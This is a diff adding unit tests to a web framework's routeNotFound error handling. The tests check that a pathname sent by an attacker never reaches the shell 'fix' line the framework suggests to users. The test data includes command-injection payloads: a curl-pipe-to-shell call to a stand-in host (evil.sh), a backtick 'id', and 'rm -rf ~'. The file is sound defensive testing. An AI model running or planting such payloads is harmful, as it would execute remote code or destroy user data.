@@ -36,6 +36,39 @@ describe('routeNotFound', () => {
     expect(error.fix).toBe('x routes list --json   # then: x g route /x');
     expect(error.docs).toBe(ERROR_DOCS_URL);
   });
+
+  /**
+   * The pathname is whatever an unauthenticated stranger typed, and the `fix:` is a line the
+   * framework tells its reader to RUN. Reproduced against the shipped router:
+   * `GET /$(curl -s http://evil.sh|sh)` rendered
+   * `fix: x routes list --json   # then: x g route /$(curl -s http://evil.sh|sh)`, command
+   * substitution and all, in the terminal of whoever pasted the error they were sent.
+   */
+  test('a hostile pathname never reaches the fix line, in any form', () => {
+    for (const pathname of [
+      '/$(curl -s http://evil.sh|sh)',
+      '/`id`',
+      '/a;rm -rf ~',
+      '/a b',
+      '/a\nb',
+    ]) {
+      const { fix } = routeNotFound('GET', pathname);
+      // Not "escaped" and not "quoted": absent. Quoting is `renderFixLiteral`, and its double
+      // quotes leave `$(…)` live in every POSIX shell.
+      expect(fix).not.toContain(pathname);
+      expect(fix).not.toContain('$(');
+      expect(fix).not.toContain('`');
+      // Still a command, and still one naming what to substitute — a fix that degraded to
+      // nothing is a fix nobody can act on.
+      expect(fix).toContain('x routes list --json');
+      expect(fix).toContain('x g route ');
+    }
+  });
+
+  test('the pathname still travels where a reader needs it — the cause', () => {
+    // The value is not suppressed, it is moved to the field that is READ rather than RUN.
+    expect(routeNotFound('GET', '/$(id)').cause).toContain('/$(id)');
+  });
 });
 
 describe('pathInvalid', () => {
